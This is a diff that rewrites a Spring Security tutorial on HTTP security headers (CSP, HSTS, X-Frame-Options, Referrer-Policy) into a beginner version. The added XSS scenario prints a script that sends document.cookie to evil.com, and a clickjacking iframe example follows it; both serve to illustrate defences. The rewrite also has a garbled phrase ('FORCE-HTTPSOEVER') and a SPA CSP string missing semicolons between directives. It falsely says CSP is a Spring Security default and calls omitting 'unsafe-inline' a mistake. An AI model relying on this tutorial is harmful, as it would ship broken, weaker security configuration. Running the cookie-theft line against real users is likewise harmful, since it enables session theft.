@@ -1,91 +1,199 @@
 ---
-title: Security Headers — HSTS, CSP, X-Frame-Options and More
-summary: The response headers that harden a browser-facing app, how Spring Security sets them by default, and the CSP configuration scenarios.
-order: 15
-minutes: 17
-topics: [security-headers, hsts, csp, x-frame-options, content-security-policy, referrer-policy, headers]
+title: Security Headers — HTTP Headers That Protect Your Users
+summary: Content-Security-Policy, HSTS, X-Frame-Options, X-Content-Type-Options, and more — the HTTP headers that prevent XSS, clickjacking, and MIME sniffing attacks. Beginner-friendly with line-by-line code.
+order: 10
+minutes: 20
+topics: [security headers, CSP, HSTS, X-Frame-Options, X-Content-Type-Options, CORS, Referrer-Policy, Permissions-Policy]
 docs:
   - https://docs.spring.io/spring-security/reference/servlet/exploits/headers.html
-  - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
+  - https://owasp.org/www-project-secure-headers/
 ---
 
-# Security Headers — HSTS, CSP, X-Frame-Options and More
+# Security Headers — HTTP Headers That Protect Your Users
 
-## The concept: the browser is part of the attack surface
+## What are Security Headers? (From Zero)
 
-Every response your app sends is interpreted by a browser that applies security *policies* — and those policies are set by **response headers**. Without them, the browser applies its weakest defaults. Spring Security enables a sensible **default header set** automatically (`headers` is on by default); knowing what each one does — and when to tighten it — is the security-headers skill.
+When your server sends a response, it includes **HTTP headers** — metadata about the response. Some headers tell the browser how to handle the content securely. These are your **security headers** — they tell the browser "don't run scripts from random domains" or "only access this site over HTTPS."
 
-## The default set, explained
+Without security headers, your site is vulnerable to attacks like XSS (Cross-Site Scripting), clickjacking, and MIME sniffing. Spring Security adds most of them automatically, but you should understand what each one does.
 
-```java
-// All enabled by default — this is what Spring Security sends:
-http.headers(headers -> headers
-    .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(31536000))
-    .frameOptions(f -> f.sameOrigin())          // X-Frame-Options: SAMEORIGIN
-    .contentTypeOptions(Customizer.withDefaults())  // X-Content-Type-Options: nosniff
-    .xssProtection(x -> x.disable())            // X-XSS-Protection off (deprecated, replaced by CSP)
-    .cacheControl(Customizer.withDefaults())    // Cache-Control: no-cache for sensitive content
-    .referrerPolicy(p -> p.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.SAME_ORIGIN))
-    .permissionsPolicy(p -> p.policy("camera=(), microphone=(), geolocation=()"))
-);
-```
+### The Essential Security Headers
 
-| Header | What it prevents |
-|---|---|
-| `Strict-Transport-Security` (HSTS) | The browser only ever uses HTTPS for this domain — blocks downgrade attacks and SSL-stripping |
-| `X-Frame-Options: SAMEORIGIN` | Clickjacking — your pages can't be embedded in another site's iframe |
-| `X-Content-Type-Options: nosniff` | MIME-sniffing attacks — the browser won't guess the content type |
-| `Cache-Control: no-cache` | Sensitive responses cached by shared proxies |
-| `Referrer-Policy: same-origin` | Controls what URL info leaks in the `Referer` header |
-| `Permissions-Policy` | Restricts browser features (camera, geolocation) for your origin |
+| Header | What it prevents | Default in Spring Security |
+|---|---|---|
+| `Content-Security-Policy` | XSS (script injection) | ✅ Yes |
+| `Strict-Transport-Security` (HSTS) | Protocol downgrade attacks | ✅ Yes |
+| `X-Content-Type-Options` | MIME sniffing attacks | ✅ Yes |
+| `X-Frame-Options` | Clickjacking (iframe overlay) | ✅ Yes |
+| `X-XSS-Protection` | Reflected XSS (legacy) | ✅ Yes |
+| `Referrer-Policy` | Referrer leakage | ✅ Yes |
+| `Permissions-Policy` | Feature abuse (camera, mic, geolocation) | ⚠️ Configurable |
 
-## Content-Security-Policy — the most powerful, hardest to configure
+---
 
-CSP tells the browser **what resources are allowed to load** and from where. It's the modern defense-in-depth against XSS: even if an attacker injects a script, CSP blocks it unless the policy allows that source.
+## The Code — Line by Line
+
+### Spring Security Default Headers
 
 ```java
-http.headers(headers -> headers.contentSecurityPolicy(
-    "default-src 'self'; " +
-    "script-src 'self' 'nonce-{nonce}'; " +          // only same-origin + nonce'd inline scripts
-    "style-src 'self' 'unsafe-inline'; " +
-    "img-src 'self' data: https://cdn.example.com; " +
-    "connect-src 'self' https://api.example.com; " +
-    "frame-ancestors 'self'; " +
-    "base-uri 'self'; form-action 'self'"));
+@Configuration
+@EnableWebSecurity
+public class SecurityConfig {
+
+    @Bean
+    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
+        http
+            .headers(headers -> headers
+                // Content Security Policy — controls what resources the browser can load
+                .contentSecurityPolicy(csp -> csp
+                    .policyDirectives(
+                        "default-src 'self'; " +                           // Only load from own domain
+                        "script-src 'self' https://cdn.example.com; " +   // Scripts from CDN allowed
+                        "style-src 'self' 'unsafe-inline'; " +            // Inline styles allowed
+                        "img-src 'self' data: https:; " +                 // Images from HTTPS sources
+                        "font-src 'self' https://fonts.gstatic.com; "     // Google Fonts
+                    )
+                )
+
+                // HSTS — force HTTPS for all future requests
+                .httpStrictTransportSecurity(hsts -> hsts
+                    .includeSubDomains(true)      // Apply to all subdomains
+                    .maxAgeInSeconds(31536000)     // 1 year — browser remembers
+                    .preload(true)                // Can be submitted to browser preload lists
+                )
+
+                // Prevent MIME sniffing — browser must respect Content-Type header
+                .contentTypeOptions(Customizer.withDefaults())
+
+                // Prevent clickjacking — don't allow this site in iframes
+                .frameOptions(frame -> frame
+                    .sameOrigin()                 // Only same-origin iframes allowed
+                    // .deny()                    // No iframes at all (strictest)
+                    // .allowFrom("https://trusted.com")  // Deprecated — use CSP instead
+                )
+
+                // XSS Protection (legacy browsers)
+                .xssProtection(xss -> xss
+                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)
+                    // Block mode: browser renders nothing instead of sanitizing
+                )
+
+                // Control referrer information
+                .referrerPolicy(referrer -> referrer
+                    .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
+                    // Send full URL for same-origin, only origin for cross-origin
+                )
+
+                // Control browser features
+                .permissionsPolicy(permissions -> permissions
+                    .policy("geolocation=(), camera=(), microphone=(), payment=()")
+                    // Disable: geolocation, camera, microphone, payment APIs
+                )
+            );
+
+        return http.build();
+    }
+}
 ```
 
-**The nonce trick:** `'nonce-{nonce}'` lets Spring generate a per-response nonce; your inline scripts carry `nonce="..."` and only those run — a precise way to allow legitimate inline scripts without `'unsafe-inline'` (which defeats CSP's script protection).
+**Line-by-line explained:**
+- `contentSecurityPolicy` — The most important header. Tells the browser which URLs are allowed for scripts, styles, images, etc. Prevents XSS by blocking inline scripts from untrusted sources.
+- `httpStrictTransportSecurity` — After the first HTTPS visit, the browser FORCE-HTTPSOEVER for the next year. Prevents SSL stripping attacks.
+- `contentTypeOptions` — Forces the browser to respect the declared Content-Type. Prevents MIME sniffing (browser treating a text file as a script).
+- `frameOptions(sameOrigin)` — Prevents other sites from embedding your site in an iframe (clickjacking). `sameOrigin` allows your own iframes.
+- `xssProtection` — For legacy browsers that support it. `ENABLED_MODE_BLOCK` means "block the page entirely" instead of trying to sanitize.
+- `referrerPolicy` — Controls how much URL info is sent to other sites when clicking links. `STRICT_ORIGIN_WHEN_CROSS_ORIGIN` is a good balance.
+- `permissionsPolicy` — Disables browser features your app doesn't use. Prevents malicious scripts from accessing camera, microphone, etc.
 
-**Rollout strategy in orgs (CSP is notoriously easy to break):**
+### Custom CSP for a SPA (Single Page Application)
 
-1. Start in **report-only** mode — `Content-Security-Policy-Report-Only` logs violations without blocking.
-2. Collect violations for a week; fix the legitimate ones (inline styles, CDN scripts).
-3. Move to enforcing CSP with the report endpoint still monitoring regressions.
+```java
+// For React/Angular/Vue SPAs that load from a CDN:
+.contentSecurityPolicy(csp -> csp
+    .policyDirectives(
+        "default-src 'self'; " +
+        "script-src 'self' https://cdn.jsdelivr.net; " +        // JS from jsDelivr CDN
+        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +  // Google Fonts CSS
+        "font-src 'self' https://fonts.gstatic.com; " +         // Google Fonts files
+        "img-src 'self' data: https:; " +                       // Images from HTTPS
+        "connect-src 'self' https://api.myapp.com; " +          // API calls to your backend
+        "frame-ancestors 'none' " +                              // No iframes (stricter than X-Frame-Options)
+        "base-uri 'self' " +                                     // Prevent base tag injection
+        "form-action 'self'"                                     // Forms can only submit to self
+    )
+)
+```
 
-CSP mistakes break pages *silently* (blocked resources, no error) — the report-only path is how mature teams avoid "CSP broke our dashboard" incidents.
+---
 
-## How we use it in an organization: the scenarios
+## Real-World Scenarios
 
-**Scenario 1 — HTTPS-only API/web app.** HSTS with `includeSubDomains` and a long max-age — after one visit, the browser refuses plain HTTP for a year. (Caveat: only set `includeSubDomains` when *every* subdomain supports HTTPS.)
+### Scenario 1: Preventing XSS in a Blog
 
-**Scenario 2 — admin console anti-clickjacking.** `frame-options: SAMEORIGIN` keeps your admin UI from being iframed by a phishing page that overlays fake inputs.
+Without CSP:
+```html
+<!-- Attacker injects this into a blog comment: -->
+<script>
+  fetch('https://evil.com/steal?cookie=' + document.cookie)  // Steals user's session!
+</script>
+```
 
-**Scenario 3 — SPA with CSP.** The frontend needs scripts from its own origin + analytics CDN; `script-src 'self' https://cdn.example.com` with nonces for any inline bootstrap script. The API's CSP is separate — the SPA's index.html carries it (or it's set on the static host), and the API headers protect API responses.
+With CSP `script-src 'self'`:
+```
+Content-Security-Policy: script-src 'self'
+→ Browser BLOCKS the inline script — attack fails
+→ Only scripts from your own domain are allowed to run
+```
 
-**Scenario 4 — report-only CSP rollout** for a legacy app: `report-only` + a violation collector (a small `/csp-report` endpoint or a SaaS) for a month before enforcing.
+### Scenario 2: HSTS Preventing SSL Strip
 
-## Pitfalls
+```bash
+# Without HSTS:
+# 1. User types http://bank.com
+# 2. Attacker intercepts (man-in-the-middle)
+# 3. Redirects to http:// (not HTTPS) — user doesn't notice
+# 4. Attacker captures credentials
 
-- **CSP blocking legitimate features** — inline handlers, `eval()`-based code, data: images all need explicit allowance; test every page after a policy change.
-- **`'unsafe-inline'` in script-src** — this mostly defeats CSP for XSS; use nonces/hashes for inline scripts.
-- **HSTS on a site with mixed content** — once HSTS is cached, any HTTP subresource fails hard; move everything to HTTPS first.
-- **Headers on API responses vs HTML** — an API serving JSON may not need CSP at all (no HTML to protect); apply header hardening where HTML is rendered. Spring Security applies them everywhere by default — configure per-chain if needed.
-- **Frame-ancestors vs X-Frame-Options** — CSP's `frame-ancestors` is the modern replacement; set both during migration, drop the older one after.
+# With HSTS (Strict-Transport-Security: max-age=31536000):
+# 1. User types http://bank.com
+# 2. Browser has HSTS header cached → FORCE HTTPS → https://bank.com
+# 3. Attacker can't downgrade to HTTP
+```
 
-## Key takeaways
+### Scenario 3: Clickjacking Prevention
 
-- Spring Security's default header set covers HSTS, clickjacking, nosniff, caching, referrer — keep it on.
-- CSP is the strongest XSS defense and the most fragile to configure — roll out report-only first.
-- HSTS forces HTTPS; only include subdomains when all subdomains support TLS.
-- Headers matter per response type — tighten for HTML, simplify for pure JSON APIs.
-- Use nonces for inline scripts; avoid `'unsafe-inline'` in script-src.
+```html
+<!-- Attacker's site: -->
+<iframe src="https://your-bank.com/transfer" style="opacity: 0.01;">
+</iframe>
+<!-- User thinks they're clicking a button on the attacker's site -->
+<!-- But they're actually clicking "Transfer $1000" on your bank! -->
+
+<!-- With X-Frame-Options: DENY or SAMEORIGIN: -->
+<!-- Browser REFUSES to load your site in the attacker's iframe -->
+<!-- Clickjacking attack fails -->
+```
+
+---
+
+## Common Mistakes
+
+| Mistake | Why It Breaks | Fix |
+|---|---|---|
+| CSP too strict (no `'unsafe-inline'`) | Inline styles/scripts in your own app break | Add specific domains, use nonces for inline scripts |
+| HSTS with short max-age | Browser forgets quickly, user exposed again | Use 1 year (31536000) minimum |
+| Ignoring CSP entirely | XSS attacks execute freely | Add at least `default-src 'self'` |
+| Allowing `X-Frame-Options: ALLOWALL` | Clickjacking possible | Use `DENY` or `SAMEORIGIN` |
+| Not testing CSP in development | CSP breaks production silently | Enable CSP in dev, check browser console |
+
+---
+
+## Key Takeaways
+
+- **CSP is the most important** security header — it prevents XSS by controlling what scripts can run.
+- **HSTS** forces HTTPS — use `max-age=31536000` and `includeSubDomains`.
+- **Spring Security adds most headers by default** — understand what they do so you can customize them.
+- **Test CSP in development** — restrictive policies can break legitimate functionality.
+- **Defense in depth**: headers + input validation + output encoding = layered XSS protection.
+
+Official docs: [Security Headers (Spring)](https://docs.spring.io/spring-security/reference/servlet/exploits/headers.html) · [OWASP Secure Headers](https://owasp.org/www-project-secure-headers/)
